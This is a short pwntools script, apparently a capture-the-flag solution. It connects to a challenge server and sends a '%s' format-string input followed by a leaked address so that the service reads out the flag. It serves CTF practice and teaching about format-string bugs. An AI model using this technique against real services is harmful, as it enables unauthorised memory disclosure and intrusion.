from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5080)
# Use process() for local challenge files.
# conn = process('./challenge')

# Receive the prompt
flag_addr = int(conn.recvline().strip())
conn.recvuntil(b'? ')
conn.sendline('%s')
conn.recvuntil(b'? ')
conn.sendline(str(flag_addr))

conn.interactive()